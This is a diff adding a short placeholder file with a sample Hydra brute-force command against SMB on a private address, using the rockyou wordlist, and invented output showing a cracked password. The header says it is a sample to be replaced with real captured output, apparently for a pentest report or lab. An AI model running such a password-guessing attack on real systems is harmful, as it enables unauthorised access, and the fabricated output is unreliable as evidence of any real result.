@@ -1,0 +1,9 @@
+# Sample Hydra brute-force run against Windows target (SMB/RDP)
+# Replace with your actual captured output.
+
+hydra -l john.doe -P /usr/share/wordlists/rockyou.txt smb://192.168.1.50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
+[ATTEMPT] target 192.168.1.50 - login "john.doe" - pass "123456" - 1 of 14344399
+...
+[SMB] host: 192.168.1.50   login: john.doe   password: Summer2024!
+1 of 1 target successfully completed, 1 valid password found
